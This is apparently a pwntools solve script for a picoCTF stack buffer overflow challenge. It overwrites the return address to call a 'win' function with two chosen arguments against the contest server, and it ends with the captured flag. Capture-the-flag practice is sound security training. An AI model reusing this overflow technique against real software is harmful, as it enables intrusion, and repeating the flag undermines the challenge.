from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *0x08049371
continue
'''.format(**locals())

exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
# p = start()
p = remote("saturn.picoctf.net", 52773)

arg1 = 0xCAFEF00D
arg2 = 0xF00DF00D
payload = flat(
    cyclic(112),
    elf.sym[b'win'],
    0,
    arg1,
    arg2
)

p.sendlineafter(b"Please enter your string: ", payload)
p.interactive()

# picoCTF{argum3nt5_4_d4yZ_4b24a3aa}
